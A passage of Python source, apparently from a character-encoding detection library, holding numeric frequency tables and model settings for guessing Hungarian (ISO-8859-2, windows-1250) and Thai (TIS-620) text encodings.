159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,
175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,
191,192,193,194,195,196,197, 75,198,199,200,201,202,203,204,205,
79,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,
221, 51, 81,222, 78,223,224,225,226, 44,227,228,229, 61,230,231,
232,233,234, 58,235, 66, 59,236,237,238, 60, 69, 63,239,240,241,
82, 14, 74,242, 70, 80,243, 72,244, 15, 83, 77, 84, 30, 76, 85,
245,246,247, 25, 73, 42, 24,248,249,250, 31, 56, 29,251,252,253,
)
win1250HungarianCharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,
46, 72, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,
253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,
23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,
161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,
177,178,179,180, 78,181, 69,182,183,184,185,186,187,188,189,190,
191,192,193,194,195,196,197, 76,198,199,200,201,202,203,204,205,
81,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,
221, 51, 83,222, 80,223,224,225,226, 44,227,228,229, 61,230,231,
232,233,234, 58,235, 66, 59,236,237,238, 60, 70, 63,239,240,241,
84, 14, 75,242, 71, 82,243, 73,244, 15, 85, 79, 86, 30, 77, 87,
245,246,247, 25, 74, 42, 24,248,249,250, 31, 56, 29,251,252,253,
)
HungarianLangModel = (
0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,2,3,3,1,1,2,2,2,2,2,1,2,
3,2,2,3,3,3,3,3,2,3,3,3,3,3,3,1,2,3,3,3,3,2,3,3,1,1,3,3,0,1,1,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,
3,2,1,3,3,3,3,3,2,3,3,3,3,3,1,1,2,3,3,3,3,3,3,3,1,1,3,2,0,1,1,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,1,1,2,3,3,3,1,3,3,3,3,3,1,3,3,2,2,0,3,2,3,
0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,3,3,3,2,3,3,2,3,3,3,3,3,2,3,3,2,2,3,2,3,2,0,3,2,2,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,
3,3,3,3,3,3,2,3,3,3,3,3,2,3,3,3,1,2,3,2,2,3,1,2,3,3,2,2,0,3,3,3,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,3,2,3,3,3,3,2,3,3,3,3,0,2,3,2,
0,0,0,1,1,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,1,1,1,3,3,2,1,3,2,2,3,2,1,3,2,2,1,0,3,3,1,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,2,2,3,3,3,3,3,1,2,3,3,3,3,1,2,1,3,3,3,3,2,2,3,1,1,3,2,0,1,1,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,2,1,3,3,3,3,3,2,2,1,3,3,3,0,1,1,2,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,2,3,3,3,2,0,3,2,3,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,1,0,
3,3,3,3,3,3,2,3,3,3,2,3,2,3,3,3,1,3,2,2,2,3,1,1,3,3,1,1,0,3,3,2,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,2,3,3,3,2,3,2,3,3,3,2,3,3,3,3,3,1,2,3,2,2,0,2,2,2,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,2,2,2,3,1,3,3,2,2,1,3,3,3,1,1,3,1,2,3,2,3,2,2,2,1,0,2,2,2,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,
3,1,1,3,3,3,3,3,1,2,3,3,3,3,1,2,1,3,3,3,2,2,3,2,1,0,3,2,0,1,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,1,3,3,3,3,3,1,2,3,3,3,3,1,1,0,3,3,3,3,0,2,3,0,0,2,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,2,3,3,2,2,2,2,3,3,0,1,2,3,2,3,2,2,3,2,1,2,0,2,2,2,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,
3,3,3,3,3,3,1,2,3,3,3,2,1,2,3,3,2,2,2,3,2,3,3,1,3,3,1,1,0,2,3,2,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,1,2,2,2,2,3,3,3,1,1,1,3,3,1,1,3,1,1,3,2,1,2,3,1,1,0,2,2,2,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,2,1,2,1,1,3,3,1,1,1,1,3,3,1,1,2,2,1,2,1,1,2,2,1,1,0,2,2,1,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,1,1,2,1,1,3,3,1,0,1,1,3,3,2,0,1,1,2,3,1,0,2,2,1,0,0,1,3,2,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,2,1,3,3,3,3,3,1,2,3,2,3,3,2,1,1,3,2,3,2,1,2,2,0,1,2,1,0,0,1,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,3,3,3,2,2,2,2,3,1,2,2,1,1,3,3,0,3,2,1,2,3,2,1,3,3,1,1,0,2,1,3,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,3,3,2,2,2,3,2,3,3,3,2,1,1,3,3,1,1,1,2,2,3,2,3,2,2,2,1,0,2,2,1,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
1,0,0,3,3,3,3,3,0,0,3,3,2,3,0,0,0,2,3,3,1,0,1,2,0,0,1,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,2,3,3,3,3,3,1,2,3,3,2,2,1,1,0,3,3,2,2,1,2,2,1,0,2,2,0,1,1,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,2,2,1,3,1,2,3,3,2,2,1,1,2,2,1,1,1,1,3,2,1,1,1,1,2,1,0,1,2,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
2,3,3,1,1,1,1,1,3,3,3,0,1,1,3,3,1,1,1,1,1,2,2,0,3,1,1,2,0,2,1,1,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
3,1,0,1,2,1,2,2,0,1,2,3,1,2,0,0,0,2,1,1,1,1,1,2,0,0,1,1,0,0,0,0,
1,2,1,2,2,2,1,2,1,2,0,2,0,2,2,1,1,2,1,1,2,1,1,1,0,1,0,0,0,1,1,0,
1,1,1,2,3,2,3,3,0,1,2,2,3,1,0,1,0,2,1,2,2,0,1,1,0,0,1,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,3,3,2,2,1,0,0,3,2,3,2,0,0,0,1,1,3,0,0,1,1,0,0,2,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,1,2,2,3,3,1,0,1,3,2,3,1,1,1,0,1,1,1,1,1,3,1,0,0,2,2,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,1,1,2,2,2,1,0,1,2,3,3,2,0,0,0,2,1,1,1,2,1,1,1,0,1,1,1,0,0,0,
1,2,2,2,2,2,1,1,1,2,0,2,1,1,1,1,1,2,1,1,1,1,1,1,0,1,1,1,0,0,1,1,
3,2,2,1,0,0,1,1,2,2,0,3,0,1,2,1,1,0,0,1,1,1,0,1,1,1,1,0,2,1,1,1,
2,2,1,1,1,2,1,2,1,1,1,1,1,1,1,2,1,1,1,2,3,1,1,1,1,1,1,1,1,1,0,1,
2,3,3,0,1,0,0,0,3,3,1,0,0,1,2,2,1,0,0,0,0,2,0,0,1,1,1,0,2,1,1,1,
2,1,1,1,1,1,1,2,1,1,0,1,1,0,1,1,1,0,1,2,1,1,0,1,1,1,1,1,1,1,0,1,
2,3,3,0,1,0,0,0,2,2,0,0,0,0,1,2,2,0,0,0,0,1,0,0,1,1,0,0,2,0,1,0,
2,1,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,1,2,0,1,1,1,1,1,0,1,
3,2,2,0,1,0,1,0,2,3,2,0,0,1,2,2,1,0,0,1,1,1,0,0,2,1,0,1,2,2,1,1,
2,1,1,1,1,1,1,2,1,1,1,1,1,1,0,2,1,0,1,1,0,1,1,1,0,1,1,2,1,1,0,1,
2,2,2,0,0,1,0,0,2,2,1,1,0,0,2,1,1,0,0,0,1,2,0,0,2,1,0,0,2,1,1,1,
2,1,1,1,1,2,1,2,1,1,1,2,2,1,1,2,1,1,1,2,1,1,1,1,1,1,1,1,1,1,0,1,
1,2,3,0,0,0,1,0,3,2,1,0,0,1,2,1,1,0,0,0,0,2,1,0,1,1,0,0,2,1,2,1,
1,1,0,0,0,1,0,1,1,1,1,1,2,0,0,1,0,0,0,2,0,0,1,1,1,1,1,1,1,1,0,1,
3,0,0,2,1,2,2,1,0,0,2,1,2,2,0,0,0,2,1,1,1,0,1,1,0,0,1,1,2,0,0,0,
1,2,1,2,2,1,1,2,1,2,0,1,1,1,1,1,1,1,1,1,2,1,1,0,0,1,1,1,1,0,0,1,
1,3,2,0,0,0,1,0,2,2,2,0,0,0,2,2,1,0,0,0,0,3,1,1,1,1,0,0,2,1,1,1,
2,1,0,1,1,1,0,1,1,1,1,1,1,1,0,2,1,0,0,1,0,1,1,0,1,1,1,1,1,1,0,1,
2,3,2,0,0,0,1,0,2,2,0,0,0,0,2,1,1,0,0,0,0,2,1,0,1,1,0,0,2,1,1,0,
2,1,1,1,1,2,1,2,1,2,0,1,1,1,0,2,1,1,1,2,1,1,1,1,0,1,1,1,1,1,0,1,
3,1,1,2,2,2,3,2,1,1,2,2,1,1,0,1,0,2,2,1,1,1,1,1,0,0,1,1,0,1,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,2,2,0,0,0,0,0,2,2,0,0,0,0,2,2,1,0,0,0,1,1,0,0,1,2,0,0,2,1,1,1,
2,2,1,1,1,2,1,2,1,1,0,1,1,1,1,2,1,1,1,2,1,1,1,1,0,1,2,1,1,1,0,1,
1,0,0,1,2,3,2,1,0,0,2,0,1,1,0,0,0,1,1,1,1,0,1,1,0,0,1,0,0,0,0,0,
1,2,1,2,1,2,1,1,1,2,0,2,1,1,1,0,1,2,0,0,1,1,1,0,0,0,0,0,0,0,0,0,
2,3,2,0,0,0,0,0,1,1,2,1,0,0,1,1,1,0,0,0,0,2,0,0,1,1,0,0,2,1,1,1,
2,1,1,1,1,1,1,2,1,0,1,1,1,1,0,2,1,1,1,1,1,1,0,1,0,1,1,1,1,1,0,1,
1,2,2,0,1,1,1,0,2,2,2,0,0,0,3,2,1,0,0,0,1,1,0,0,1,1,0,1,1,1,0,0,
1,1,0,1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,0,0,1,1,1,0,1,0,1,
2,1,0,2,1,1,2,2,1,1,2,1,1,1,0,0,0,1,1,0,1,1,1,1,0,0,1,1,1,0,0,0,
1,2,2,2,2,2,1,1,1,2,0,2,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,1,0,
1,2,3,0,0,0,1,0,2,2,0,0,0,0,2,2,0,0,0,0,0,1,0,0,1,0,0,0,2,0,1,0,
2,1,1,1,1,1,0,2,0,0,0,1,2,1,1,1,1,0,1,2,0,1,0,1,0,1,1,1,0,1,0,1,
2,2,2,0,0,0,1,0,2,1,2,0,0,0,1,1,2,0,0,0,0,1,0,0,1,1,0,0,2,1,0,1,
2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,0,1,1,1,1,1,0,1,
1,2,2,0,0,0,1,0,2,2,2,0,0,0,1,1,0,0,0,0,0,1,1,0,2,0,0,1,1,1,0,1,
1,0,1,1,1,1,1,1,0,1,1,1,1,0,0,1,0,0,1,1,0,1,0,1,1,1,1,1,0,0,0,1,
1,0,0,1,0,1,2,1,0,0,1,1,1,2,0,0,0,1,1,0,1,0,1,1,0,0,1,0,0,0,0,0,
0,2,1,2,1,1,1,1,1,2,0,2,0,1,1,0,1,2,1,0,1,1,1,0,0,0,0,0,0,1,0,0,
2,1,1,0,1,2,0,0,1,1,1,0,0,0,1,1,0,0,0,0,0,1,0,0,1,0,0,0,2,1,0,1,
2,2,1,1,1,1,1,2,1,1,0,1,1,1,1,2,1,1,1,2,1,1,0,1,0,1,1,1,1,1,0,1,
1,2,2,0,0,0,0,0,1,1,0,0,0,0,2,1,0,0,0,0,0,2,0,0,2,2,0,0,2,0,0,1,
2,1,1,1,1,1,1,1,0,1,1,0,1,1,0,1,0,0,0,1,1,1,1,0,0,1,1,1,1,0,0,1,
1,1,2,0,0,3,1,0,2,1,1,1,0,0,1,1,1,0,0,0,1,1,0,0,0,1,0,0,1,0,1,0,
1,2,1,0,1,1,1,2,1,1,0,1,1,1,1,1,0,0,0,1,1,1,1,1,0,1,0,0,0,1,0,0,
2,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,2,0,0,0,
2,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,2,1,1,0,0,1,1,1,1,1,0,1,
2,1,1,1,2,1,1,1,0,1,1,2,1,0,0,0,0,1,1,1,1,0,1,0,0,0,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,1,0,1,1,1,1,1,0,0,1,1,2,1,0,0,0,1,1,0,0,0,1,1,0,0,1,0,1,0,0,0,
1,2,1,1,1,1,1,1,1,1,0,1,0,1,1,1,1,1,1,0,1,1,1,0,0,0,0,0,0,1,0,0,
2,0,0,0,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,1,2,0,0,1,0,0,1,0,1,0,0,0,
0,1,1,1,1,1,1,1,1,2,0,1,1,1,1,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,
1,0,0,1,1,1,1,1,0,0,2,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,
0,1,1,1,1,1,1,0,1,1,0,1,0,1,1,0,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,
1,0,0,1,1,1,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
0,1,1,1,1,1,0,0,1,1,0,1,0,1,0,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,
0,0,0,1,0,0,0,0,0,0,1,1,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,1,1,1,0,1,0,0,1,1,0,1,0,1,1,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,
2,1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,0,0,1,0,0,1,0,1,0,1,1,1,0,0,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,1,1,1,1,0,0,0,1,1,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,
0,1,1,1,1,1,1,0,1,1,0,1,0,1,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,
)
Latin2HungarianModel = {
'charToOrderMap': Latin2_HungarianCharToOrderMap,
'precedenceMatrix': HungarianLangModel,
'mTypicalPositiveRatio': 0.947368,
'keepEnglishLetter': True,
'charsetName': "ISO-8859-2"
}
Win1250HungarianModel = {
'charToOrderMap': win1250HungarianCharToOrderMap,
'precedenceMatrix': HungarianLangModel,
'mTypicalPositiveRatio': 0.947368,
'keepEnglishLetter': True,
'charsetName': "windows-1250"
}
TIS620CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253,182,106,107,100,183,184,185,101, 94,186,187,108,109,110,111,
188,189,190, 89, 95,112,113,191,192,193,194,253,253,253,253,253,
253, 64, 72, 73,114, 74,115,116,102, 81,201,117, 90,103, 78, 82,
96,202, 91, 79, 84,104,105, 97, 98, 92,203,253,253,253,253,253,
209,210,211,212,213, 88,214,215,216,217,218,219,220,118,221,222,
223,224, 99, 85, 83,225,226,227,228,229,230,231,232,233,234,235,
236,  5, 30,237, 24,238, 75,  8, 26, 52, 34, 51,119, 47, 58, 57,
49, 53, 55, 43, 20, 19, 44, 14, 48,  3, 17, 25, 39, 62, 31, 54,
45,  9, 16,  2, 61, 15,239, 12, 42, 46, 18, 21, 76,  4, 66, 63,
22, 10,  1, 36, 23, 13, 40, 27, 32, 35, 86,240,241,242,243,244,
11, 28, 41, 29, 33,245, 50, 37,  6,  7, 67, 77, 38, 93,246,247,
68, 56, 59, 65, 69, 60, 70, 80, 71, 87,248,249,250,251,252,253,
)
ThaiLangModel = (
0,1,3,3,3,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,0,0,3,3,3,0,3,3,3,3,
0,3,3,0,0,0,1,3,0,3,3,2,3,3,0,1,2,3,3,3,3,0,2,0,2,0,0,3,2,1,2,2,
3,0,3,3,2,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,3,0,3,2,3,0,2,2,2,3,
0,2,3,0,0,0,0,1,0,1,2,3,1,1,3,2,2,0,1,1,0,0,1,0,0,0,0,0,0,0,1,1,
3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,3,3,2,3,2,3,3,2,2,2,
3,1,2,3,0,3,3,2,2,1,2,3,3,1,2,0,1,3,0,1,0,0,1,0,0,0,0,0,0,0,1,1,
3,3,2,2,3,3,3,3,1,2,3,3,3,3,3,2,2,2,2,3,3,2,2,3,3,2,2,3,2,3,2,2,
3,3,1,2,3,1,2,2,3,3,1,0,2,1,0,0,3,1,2,1,0,0,1,0,0,0,0,0,0,1,0,1,
3,3,3,3,3,3,2,2,3,3,3,3,2,3,2,2,3,3,2,2,3,2,2,2,2,1,1,3,1,2,1,1,
3,2,1,0,2,1,0,1,0,1,1,0,1,1,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,
3,3,3,2,3,2,3,3,2,2,3,2,3,3,2,3,1,1,2,3,2,2,2,3,2,2,2,2,2,1,2,1,
2,2,1,1,3,3,2,1,0,1,2,2,0,1,3,0,0,0,1,1,0,0,0,0,0,2,3,0,0,2,1,1,
3,3,2,3,3,2,0,0,3,3,0,3,3,0,2,2,3,1,2,2,1,1,1,0,2,2,2,0,2,2,1,1,
0,2,1,0,2,0,0,2,0,1,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,
3,3,2,3,3,2,0,0,3,3,0,2,3,0,2,1,2,2,2,2,1,2,0,0,2,2,2,0,2,2,1,1,
0,2,1,0,2,0,0,2,0,1,1,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,
3,3,2,3,2,3,2,0,2,2,1,3,2,1,3,2,1,2,3,2,2,3,0,2,3,2,2,1,2,2,2,2,
1,2,2,0,0,0,0,2,0,1,2,0,1,1,1,0,1,0,3,1,1,0,0,0,0,0,0,0,0,0,1,0,
3,3,2,3,3,2,3,2,2,2,3,2,2,3,2,2,1,2,3,2,2,3,1,3,2,2,2,3,2,2,2,3,
3,2,1,3,0,1,1,1,0,2,1,1,1,1,1,0,1,0,1,1,0,0,0,0,0,0,0,0,0,2,0,0,
1,0,0,3,0,3,3,3,3,3,0,0,3,0,2,2,3,3,3,3,3,0,0,0,1,1,3,0,0,0,0,2,
0,0,1,0,0,0,0,0,0,0,2,3,0,0,0,3,0,2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,
2,0,3,3,3,3,0,0,2,3,0,0,3,0,3,3,2,3,3,3,3,3,0,0,3,3,3,0,0,0,3,3,
0,0,3,0,0,0,0,2,0,0,2,1,1,3,0,0,1,0,0,2,3,0,1,0,0,0,0,0,0,0,1,0,
3,3,3,3,2,3,3,3,3,3,3,3,1,2,1,3,3,2,2,1,2,2,2,3,1,1,2,0,2,1,2,1,
2,2,1,0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,
3,0,2,1,2,3,3,3,0,2,0,2,2,0,2,1,3,2,2,1,2,1,0,0,2,2,1,0,2,1,2,2,
0,1,1,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,2,1,3,3,1,1,3,0,2,3,1,1,3,2,1,1,2,0,2,2,3,2,1,1,1,1,1,2,
3,0,0,1,3,1,2,1,2,0,3,0,0,0,1,0,3,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,
3,3,1,1,3,2,3,3,3,1,3,2,1,3,2,1,3,2,2,2,2,1,3,3,1,2,1,3,1,2,3,0,
2,1,1,3,2,2,2,1,2,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,
3,3,2,3,2,3,3,2,3,2,3,2,3,3,2,1,0,3,2,2,2,1,2,2,2,1,2,2,1,2,1,1,
2,2,2,3,0,1,3,1,1,1,1,0,1,1,0,2,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,2,3,2,2,1,1,3,2,3,2,3,2,0,3,2,2,1,2,0,2,2,2,1,2,2,2,2,1,
3,2,1,2,2,1,0,2,0,1,0,0,1,1,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,2,3,1,2,3,3,2,2,3,0,1,1,2,0,3,3,2,2,3,0,1,1,3,0,0,0,0,
3,1,0,3,3,0,2,0,2,1,0,0,3,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,2,3,2,3,3,0,1,3,1,1,2,1,2,1,1,3,1,1,0,2,3,1,1,1,1,1,1,1,1,
3,1,1,2,2,2,2,1,1,1,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
3,2,2,1,1,2,1,3,3,2,3,2,2,3,2,2,3,1,2,2,1,2,0,3,2,1,2,2,2,2,2,1,
3,2,1,2,2,2,1,1,1,1,0,0,1,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,1,3,3,0,2,1,0,3,2,0,0,3,1,0,1,1,0,1,0,0,0,0,0,1,
1,0,0,1,0,3,2,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,2,2,2,3,0,0,1,3,0,3,2,0,3,2,2,3,3,3,3,3,1,0,2,2,2,0,2,2,1,2,
0,2,3,0,0,0,0,1,0,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
3,0,2,3,1,3,3,2,3,3,0,3,3,0,3,2,2,3,2,3,3,3,0,0,2,2,3,0,1,1,1,3,
0,0,3,0,0,0,2,2,0,1,3,0,1,2,2,2,3,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,
3,2,3,3,2,0,3,3,2,2,3,1,3,2,1,3,2,0,1,2,2,0,2,3,2,1,0,3,0,0,0,0,
3,0,0,2,3,1,3,0,0,3,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,3,2,2,2,1,2,0,1,3,1,1,3,1,3,0,0,2,1,1,1,1,2,1,1,1,0,2,1,0,1,
1,2,0,0,0,3,1,1,0,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,0,3,1,0,0,0,1,0,
3,3,3,3,2,2,2,2,2,1,3,1,1,1,2,0,1,1,2,1,2,1,3,2,0,0,3,1,1,1,1,1,
3,1,0,2,3,0,0,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,2,3,0,3,3,0,2,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,2,3,1,3,0,0,1,2,0,0,2,0,3,3,2,3,3,3,2,3,0,0,2,2,2,0,0,0,2,2,
0,0,1,0,0,0,0,3,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
0,0,0,3,0,2,0,0,0,0,0,0,0,0,0,0,1,2,3,1,3,3,0,0,1,0,3,0,0,0,0,0,
0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,1,2,3,1,2,3,1,0,3,0,2,2,1,0,2,1,1,2,0,1,0,0,1,1,1,1,0,1,0,0,
1,0,0,0,0,1,1,0,3,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,2,1,0,1,1,1,3,1,2,2,2,2,2,2,1,1,1,1,0,3,1,0,1,3,1,1,1,1,
1,1,0,2,0,1,3,1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,
3,0,2,2,1,3,3,2,3,3,0,1,1,0,2,2,1,2,1,3,3,1,0,0,3,2,0,0,0,0,2,1,
0,1,0,0,0,0,1,2,0,1,1,3,1,1,2,2,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
0,0,3,0,0,1,0,0,0,3,0,0,3,0,3,1,0,1,1,1,3,2,0,0,0,3,0,0,0,0,2,0,
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,
3,3,1,3,2,1,3,3,1,2,2,0,1,2,1,0,1,2,0,0,0,0,0,3,0,0,0,3,0,0,0,0,
3,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,1,2,0,3,3,3,2,2,0,1,1,0,1,3,0,0,0,2,2,0,0,0,0,3,1,0,1,0,0,0,
0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,2,3,1,2,0,0,2,1,0,3,1,0,1,2,0,1,1,1,1,3,0,0,3,1,1,0,2,2,1,1,
0,2,0,0,0,0,0,1,0,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
